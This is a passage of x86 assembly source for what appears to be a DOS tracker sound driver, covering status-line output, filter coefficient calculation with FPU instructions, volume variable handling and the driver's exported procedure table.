;컴 GetStatus 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;
;  Returns text to show on status line, AX = display parameter
;  Carry set if not to show anything.
;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            GetStatus Far

                Cmp     CS:NumClipped, 0
                JNE     GetStatus1

                StC
                Ret

GetStatus1:
                Push    CS
                Pop     DS
                        Assume DS:Driver

                Mov     SI, Offset ClippedMsg
                Mov     BX, Word Ptr [NumClipped+2]
                Mov     AX, Word Ptr [NumClipped]

                ClC
                Ret

EndP            GetStatus
                Assume DS:Nothing

;컴 SoundCardScreen 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;
;  Function to have driver interactive part of program
;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            SoundCardScreen Far

                Mov     AX, 5
                Mov     SI, 1
                Mov     CX, CS
                Mov     DX, Offset WAVScreenList

                ClC
                Ret

EndP            SoundCardScreen

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

TempVariable    DW      0
Const1          DD      3F800000h

Proc            GetFilterFrequency              ; Given AL= Freq
                Assume DS:Driver

                ShL     AX, 8
                Mov     TempVariable, AX
                FILD    TempVariable

                FMul    FreqParameterMultiplier ; -i/(24*256)
                FLd     ST
                FRndInt
                FSub    ST(1), ST
                FXCh
                F2XM1
                FLd1
                FAdd
                FScale                          ; = 2^(i/24*256)
                FMul    FreqMultiplier          ; = r

                FLd1                            ; 1, c
                FAdd    ST, ST(1)               ; 1+c, c
                FDivR   Const1                  ; 1/(1+c), c
                FSt     DWord Ptr [SI]
                FMul
                FStP    DWord Ptr [SI+4]
                FStP    ST

                Ret

EndP            GetFilterFrequency
                Assume DS:Nothing

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Const1On16      DD      3D000000h       ; actually 1 on 32

Proc            CalculateFilterCoefficients
                Assume DS:Driver

                PushA
                Push    CS
                Pop     DS

                FNInit
                FLdCW   NewControlWord

                Mov     AL, [VolumeTable]
                Mov     SI, Offset FilterCoefficients
                ShR     AL, 1
                Call    GetFilterFrequency

                Mov     AL, [VolumeTable+1]     ; FilterFrequency1
                Add     SI, 8
                Call    GetFilterFrequency

                Mov     AL, [VolumeTable+2]     ; FilterFrequency1
                Add     SI, 8
                Call    GetFilterFrequency

                Mov     AL, [VolumeTable+3]     ; FilterFrequency1
                Add     SI, 8
                Call    GetFilterFrequency

; Now volumes
                Mov     SI, Offset VolumeTable+4
                Mov     DI, Offset FilterVolumes
                Xor     AX, AX
                Mov     CX, 4

FilterVolumeLoop1:
                LodSB
                Mov     TempVariable, AX
                FILD    TempVariable
                FMul    Const1On16
                FStP    DWord Ptr [DI]

                Add     DI, 4
                Loop    FilterVolumeLoop1

                PopA
                Ret

EndP            CalculateFilterCoefficients
                Assume DS:Nothing

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            GetVariable Far

                Xor     AH, AH
                Mov     AL, [CS:VolumeTable+DI]
                Ret
                Ret

EndP            GetVariable

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            SetVariable Far

                Push    DS

                Push    CS
                Pop     DS
                        Assume DS:Driver

                Mov     [VolumeTable+DI], AL
                Call    CalculateFilterCoefficients

                Pop     DS
                Ret

EndP            SetVariable

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            StartNoRampFunction Far

                Push    CS
                Pop     ES
                Mov     DI, Offset StartNoRamp

                Ret

EndP            StartNoRampFunction

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

EndDriver:

;********  Provided Variable Table *************

MaxNumberOfChannels     DW      0FFFFh  ; Maximum number of channels the
                                        ; driver can handle.
StopPlaySection         DW      1
DefaultChannels         DW      256
DriverFlags             DW      3       ; Bit 0 = MIDI Output
                                        ; Bit 1 = hiqual
                                        ; Bit 2 = waveform
                        DW      4 Dup (0)

;********  Provided Procedure Table *************

ProvidedTableStart:

        DW      Offset DetectCard

        DW      Offset InitSound        ; Playing related
        DW      Offset ReinitSound
        DW      Offset UninitSound

        DW      Offset Poll

        DW      Offset SetTempo         ; Sound variable related
        DW      Offset SetMixVolume
        DW      Offset SetStereo

        DW      Offset LoadSample       ; Sample related
        DW      Offset ReleaseSample
        DW      Offset ResetMemory
        DW      Offset GetStatus        ; Returns string to show on status line

        DW      Offset SoundCardScreen  ; Sound card 'screen'

        DW      Offset GetVariable      ; For interface
        DW      Offset SetVariable
        DW      Offset SendUARTOut

ProvidedTableEnd:
        DW      32-(ProvidedTableEnd-ProvidedTableStart)/2 Dup (0)

EndS

End
